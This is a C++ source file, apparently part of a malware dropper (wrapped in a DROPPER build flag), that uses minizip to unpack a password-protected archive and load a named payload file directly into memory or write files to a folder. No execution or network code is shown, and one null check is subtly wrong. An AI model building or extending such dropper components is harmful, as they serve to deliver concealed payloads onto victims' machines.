#include "minizip.h"

#ifdef DROPPER

// Function to extract files to a specified folder
std::wstring extractToFolder(unzFile zipFile, const std::vector<std::string>& filesToExtract, const std::wstring& outputDir, const std::string& password) {
    std::wstring extractedPath = outputDir;
    for (const std::string& fileName : filesToExtract) {
        if (unzLocateFile(zipFile, fileName.c_str(), 1) != UNZ_OK) {
            DEBUG_ERR("File " << fileName << " not found in archive" << std::endl);
            extractedPath.clear(); // Clear the path if extraction fails
            return extractedPath;
        }

        if (unzOpenCurrentFilePassword(zipFile, password.c_str()) != UNZ_OK) {
            DEBUG_ERR("Failed to open file " << fileName << " in archive" << std::endl);
            extractedPath.clear(); // Clear the path if extraction fails
            return extractedPath;
        }

        std::wstring outputPath = outputDir + L"\\" + std::wstring(fileName.begin(), fileName.end());
        FILE* outFile = _wfopen(outputPath.c_str(), L"wb");
        if (!outFile) {
            DEBUG_ERR("Failed to create file: " << std::string(fileName.begin(), fileName.end()) << std::endl);
            unzCloseCurrentFile(zipFile);
            extractedPath.clear(); // Clear the path if extraction fails
            return extractedPath;
        }

        const int bufferSize = 8192;
        char buffer[bufferSize];
        int bytesRead = 0;

        while ((bytesRead = unzReadCurrentFile(zipFile, buffer, bufferSize)) > 0) {
            fwrite(buffer, 1, bytesRead, outFile);
        }

        fclose(outFile);
        unzCloseCurrentFile(zipFile);

        DEBUG_MSG("Extracted file: " << fileName << " to path: " << std::string(outputPath.begin(), outputPath.end()) << std::endl);
    }

    return extractedPath;
}

// Function to load a file into memory
PBYTE loadIntoMemory(unzFile zipFile, const std::string& fileName, const std::string& password, size_t& outSize) {
    if (unzLocateFile(zipFile, fileName.c_str(), 0) != UNZ_OK) {
        DEBUG_ERR("File " << fileName << " not found in zip");
        return nullptr;
    }

    unz_file_info fileInfo;
    if (unzGetCurrentFileInfo(zipFile, &fileInfo, NULL, 0, NULL, 0, NULL, 0) != UNZ_OK) {
        DEBUG_ERR("Failed to get file info for " << fileName);
        return nullptr;
    }

    if (unzOpenCurrentFilePassword(zipFile, password.c_str()) != UNZ_OK) {
        DEBUG_ERR("Failed to open file " << fileName << " with password");
        return nullptr;
    }

    BYTE* buffer = new BYTE[fileInfo.uncompressed_size];
    int readBytes = unzReadCurrentFile(zipFile, buffer, fileInfo.uncompressed_size);

    if (readBytes < 0 || static_cast<unsigned long>(readBytes) != fileInfo.uncompressed_size) {
        DEBUG_ERR("Failed to read file " << fileName);
        delete[] buffer;
        unzCloseCurrentFile(zipFile);
        return nullptr;
    }

    unzCloseCurrentFile(zipFile);
    outSize = fileInfo.uncompressed_size;
    return buffer;
}



bool unzip_payload(
    _In_ const std::string& zipFilePath,
    _In_ const std::string& password,
    _In_ const std::string& payloadFileName,
    _Out_ PBYTE *memoryBuffer,
    _Out_ size_t *payloadSize
) {
    unzFile zipFile = unzOpen64(zipFilePath.c_str());
    if (!zipFile) {
        DEBUG_ERR("Failed to open zip file: " << zipFilePath);
        return false;
    }

    // File to load into memory
    *memoryBuffer = loadIntoMemory(zipFile, payloadFileName, password, *payloadSize);
    
    if (*memoryBuffer == nullptr || payloadSize == 0) {
        DEBUG_ERR("Failed to load " << payloadFileName << " into memory");
        unzClose(zipFile);
        return false;
    }

    DEBUG_MSG("File " << payloadFileName << " load into memory" << std::endl);

    // Close zip file
    unzClose(zipFile);

    return true;
}

#endif